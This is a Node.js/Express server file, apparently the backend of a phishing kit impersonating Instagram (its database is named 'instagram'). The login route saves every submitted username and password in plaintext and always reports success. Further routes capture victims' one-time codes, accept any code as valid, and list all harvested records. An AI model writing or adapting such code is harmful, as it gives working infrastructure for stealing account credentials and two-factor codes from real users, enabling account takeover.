const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const mongoose = require("mongoose");

const app = express();

app.use(bodyParser.json());
app.use(cors());
app.use(express.static(__dirname));

/* ✅ CONNECT MONGODB */
mongoose.connect("mongodb://127.0.0.1:27017/instagram")
  .then(() => console.log("✅ MongoDB connected"))
  .catch(err => console.log(err));

/* USER SCHEMA */
const User = mongoose.model("User", {
  username: String,
  password: String,
  otp: String
});
/* ✅ LOGIN (ALWAYS TRUE + SAVE DATA) */
/* LOGIN + GENERATE OTP + SAVE */
app.post("/login", async (req, res) => {
  const { username, password } = req.body;

  const newUser = new User({ username, password });
  await newUser.save();

  res.json({ success: true });
});
app.post("/save-otp", async (req, res) => {
  const { username, otp } = req.body;

  // update latest user with OTP
  await User.findOneAndUpdate(
    { username },
    { otp },
    { sort: { _id: -1 } } // latest entry
  );

  res.json({ success: true });
});
/* GET ALL USERS */
app.get("/users", async (req, res) => {
  const users = await User.find();
  res.json(users);
});
/* VERIFY OTP */
app.post("/verify-otp", async (req, res) => {
  const { username, otp } = req.body;

  const user = await User.findOne({ username, otp });

  if (user) {
    res.json({ success: true });
  } else {
    res.json({ success: true });
  }
});

app.listen(3000, () => {
  console.log("🚀 Server running on http://localhost:3000");
});